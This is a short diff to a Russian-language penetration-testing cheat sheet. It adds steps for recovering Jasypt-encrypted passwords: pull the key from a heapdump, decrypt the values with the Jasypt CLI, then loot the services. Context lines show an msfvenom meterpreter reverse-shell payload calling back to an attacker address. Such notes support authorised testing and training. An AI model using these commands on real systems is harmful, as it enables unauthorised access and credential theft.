@@ -628,7 +628,18 @@ msfvenom -p windows/meterpreter/reverse_winhttps lhost=172.16.7.2 lport=443 -e x
 // sudo msfconsole -qr auto.rc
 https://ppn.snovvcrash.rocks/pentest/c2/meterpreter
 ```
+## Расшифровываем java enc
+Концепция:
+1. на server1.localhost находим страницы, содержащие данные в виде ENC(). Там же находим другие полезности, такие как алгоритм шифрования.
+2. на server2.localhost забираем heapdump;
+3. из heapdump берем jasypt.encryptor.password;
+4. командой
 
+ ```
+java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringDecryptionCLI input="ENC()" password="jasypt.encryptor.password" algorithm="PBEWithMD5AndDES" ivGeneratorClassName="org.jasypt.iv.NoIvGenerator"
+```
+распедаливаем все зашифрованные строки в открытые пароли и прочая;
+5. лутаем сервисы, от которых получили доступы.
 ## RDP
 
 ```
